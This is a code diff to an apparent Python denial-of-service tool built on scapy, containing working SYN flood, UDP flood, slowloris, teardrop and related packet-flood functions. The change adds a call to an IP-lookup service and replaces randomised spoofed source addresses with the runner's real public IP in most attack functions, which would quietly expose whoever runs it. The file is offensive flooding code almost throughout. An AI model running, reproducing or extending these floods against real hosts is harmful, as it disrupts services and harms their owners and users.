@@ -3,6 +3,8 @@ from scapy.all import *
 from scapy.layers.inet import *
 from threading import Thread
 
+send_host = requests.get("https://api.ipify.org").text
+
 @click.group()
 def launch():
     """
@@ -66,7 +68,7 @@ def ddos(dostype, host, port, count, examples, lists):
         i.join()
 
 def tcp_syn_flood(host, port):
-    packet=IP(src=RandIP(), dst=host) / TCP(sport=RandShort(), dport=port, flags='S')
+    packet=IP(src=send_host, dst=host) / TCP(sport=RandShort(), dport=port, flags='S')
     send(packet, inter = .001, loop=True)
 
 def smurf(host, port):
@@ -80,7 +82,7 @@ def smurf_2(host, dsthost):
     send(packet, inter = .001, loop=True)
 
 def udp_flood(host, port):
-    packet=IP(src=RandIP(), dst=host) / UDP(sport=RandShort(), dport=port) / ('X'*5000)
+    packet=IP(src=send_host, dst=host) / UDP(sport=RandShort(), dport=port) / ('X'*5000)
     send(packet, inter = .001, loop=True)
 
 def http_get_flood(host, port):
@@ -89,9 +91,9 @@ def http_get_flood(host, port):
     r = requests.get(URL, headers=headers)
 
 def slowloris(host, port):
-    packet=IP(src=RandIP(), dst=host) / TCP(sport=RandShort(), dport=port, flags='S')
+    packet=IP(src=send_host, dst=host) / TCP(sport=RandShort(), dport=port, flags='S')
     ans = sr1(packet)
-    packet=IP(src=RandIP(), dst=host) / TCP(sport=RandShort(), dport=port, flags='A', seq=ans.ack, ack=ans.seq+1)
+    packet=IP(src=send_host, dst=host) / TCP(sport=RandShort(), dport=port, flags='A', seq=ans.ack, ack=ans.seq+1)
     ans = sr(packet/"X")
 
 def ping_of_death(host, port):
@@ -99,9 +101,9 @@ def ping_of_death(host, port):
         send(p)
 
 def teardrop(host, port):
-    send(IP(dst=host, proto=17, flags="MF")/UDP()/("X"*10))
-    send(IP(dst=host, proto=17, frag=48)/("X"*116))
-    send(IP(dst=host, proto=17, flags="MF")/UDP()/("X"*224))
+    send(IP(src=send_host, dst=host, proto=17, flags="MF")/UDP()/("X"*10))
+    send(IP(src=send_host, dst=host, proto=17, frag=48)/("X"*116))
+    send(IP(src=send_host, dst=host, proto=17, flags="MF")/UDP()/("X"*224))
 
 if __name__ == '__main__':
     launch()
